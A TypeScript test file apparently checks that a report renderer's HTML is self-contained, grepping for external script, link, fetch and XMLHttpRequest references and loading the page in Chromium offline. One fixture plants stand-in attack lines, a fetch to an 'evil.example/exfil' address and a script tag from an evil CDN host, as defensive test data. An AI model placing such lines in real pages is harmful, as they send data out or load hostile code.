/**
 * render-airplane-test.test.ts — ctx-scan-render task [4.1], beads:if-elkk.
 *
 * Self-containment: grep the rendered HTML's RAW BYTES for any external
 * `<script src=`/`<link href=` reference or an un-decoded top-level
 * `fetch(`/`XMLHttpRequest` call, asserting zero matches — then actually
 * open the file in headless Chromium with network access disabled (every
 * hostname remapped to the reserved/unroutable `240.0.0.1` range, see
 * `test/helpers/browser.ts`) and assert it still renders (the "airplane
 * test").
 *
 * The deliberately tricky part (per the prior wave's own design-intent note
 * in render.ts's module doc): a scanned source document can legitimately
 * contain the literal substrings `fetch(` / `<script src=` / `XMLHttpRequest`
 * as its own prose (e.g. a skill describing what NOT to do) — this fixture
 * plants exactly that inside a real fixture file's body, so the grep proves
 * it does NOT false-positive on scanned CONTENT, only on a genuine external
 * reference emitted by the renderer's OWN template.
 */
import { afterEach, describe, expect, test } from "bun:test";
import { cleanup, file, tmpRoot } from "./helpers/tree";
import { chromiumAvailable, runInBrowser } from "./helpers/browser";
import { makeFleet, makeNode, project, surface } from "./fixtures/render/build";
import { annotateFleetBands } from "../src/rubric";
import { renderFleetHtml } from "../src/render";

const roots: string[] = [];
afterEach(() => {
  while (roots.length) cleanup(roots.pop()!);
});
function tmp(prefix: string): string {
  const root = tmpRoot(prefix);
  roots.push(root);
  return root;
}

describe("ctx-scan render — airplane test [4.1]", () => {
  test("raw output bytes contain zero external-reference substrings, even when scanned content plants them as prose", () => {
    const root = tmp("ctx-scan-airplane-");

    // Deliberately plant the exact banned substrings inside a REAL scanned
    // document's own content — proving the grep below does not false-positive
    // on scanned prose, only on a genuine renderer-emitted reference.
    const trickyPath = `${root}/tricky-skill.md`;
    file(
      root,
      "tricky-skill.md",
      [
        "---",
        "name: tricky-skill",
        'description: "Do NOT use fetch( or <script src= or XMLHttpRequest in this codebase"',
        "---",
        "Body text also says fetch(\"https://evil.example/exfil\") and <script src=\"https://cdn.evil.example/x.js\"></script> and new XMLHttpRequest().",
      ].join("\n"),
    );

    const node = makeNode({ path: trickyPath, cls: "skills-listing", raw_chars: 400, est_tokens: 100 });
    const fleet = makeFleet([], [project("proj", `${root}`, [surface("skills-listing", [node])])]);
    annotateFleetBands(fleet);

    const html = renderFleetHtml(fleet, { fleet: true });

    // Sanity: the tricky content really did make it into the rendered file
    // SOMEWHERE (base64-encoded) — otherwise this test would trivially pass
    // for the wrong reason (the content never got embedded at all).
    expect(html.length).toBeGreaterThan(1000);
    expect(html).toContain('id="ctx-scan-data"');

    // The actual self-containment assertions: zero raw-byte matches for any
    // of the four banned patterns, across the ENTIRE file (not just outside
    // the base64 blob) — base64's alphabet cannot spell any of these
    // (no `(`, `<`, or space characters), so a whole-file grep is safe.
    expect(html).not.toMatch(/<script\s+src=/i);
    expect(html).not.toMatch(/<link\s+href=/i);
    expect(html).not.toContain("fetch(");
    expect(html).not.toContain("XMLHttpRequest");

    // Cross-check against the literal decoded content — confirms the
    // substrings really are present in DECODED form (proving they were
    // embedded, just never as raw bytes), so "zero matches" reflects the
    // base64 encoding doing its job, not the content being silently dropped.
    const dataMatch = html.match(/<script type="application\/octet-stream" id="ctx-scan-data">([^<]*)<\/script>/);
    expect(dataMatch).not.toBeNull();
    const decoded = Buffer.from(dataMatch![1]!, "base64").toString("utf8");
    expect(decoded).toContain("fetch(");
    expect(decoded).toContain("<script src=");
    expect(decoded).toContain("XMLHttpRequest");
  });

  test("no external reference substrings in the CSS/JS template strings themselves (static safety net)", () => {
    const fleet = makeFleet([], []);
    const html = renderFleetHtml(fleet, { fleet: true });
    expect(html).not.toMatch(/<script\s+src=/i);
    expect(html).not.toMatch(/<link\s+href=/i);
    expect(html).not.toContain("fetch(");
    expect(html).not.toContain("XMLHttpRequest");
  });

  test(
    "opens with network access disabled and still renders (real headless-Chromium airplane test)",
    () => {
      if (!chromiumAvailable()) {
        console.warn("[4.1] chromium not available in this environment — skipping the browser half of the airplane test");
        return;
      }

      const root = tmp("ctx-scan-airplane-render-");
      const path = `${root}/skill.md`;
      file(root, "skill.md", ["---", "name: s", 'description: "a plain fixture skill"', "---", "body"].join("\n"));
      const node = makeNode({ path, cls: "skills-listing", raw_chars: 200, est_tokens: 50 });
      const fleet = makeFleet([], [project("proj", root, [surface("skills-listing", [node])])]);
      annotateFleetBands(fleet);
      const html = renderFleetHtml(fleet, { project: "proj" });

      const driver = `
        var level1 = document.getElementById('level1-0');
        var mounts = document.querySelectorAll('.doc-content-mount');
        window.__RESULT__ = {
          initialScreen: document.documentElement.getAttribute('data-initial-screen'),
          level1Hidden: level1 ? level1.hidden : null,
          level0Hidden: document.getElementById('level0').hidden,
          mountCount: mounts.length,
          bodyHasContent: document.body.textContent.length > 100,
        };
      `;
      const result = runInBrowser(html, driver, { networkDisabled: true }) as {
        initialScreen: string;
        level1Hidden: boolean;
        level0Hidden: boolean;
        mountCount: number;
        bodyHasContent: boolean;
        driverError?: string;
      };

      expect(result.driverError).toBeUndefined();
      expect(result.initialScreen).toBe("level1-0");
      expect(result.level1Hidden).toBe(false); // initial screen is level1-0 (--project proj), so it must be visible
      expect(result.level0Hidden).toBe(true); // and the fleet screen must be hidden
      expect(result.bodyHasContent).toBe(true); // the page actually rendered real text, not a blank/broken page
    },
    30_000,
  );
});
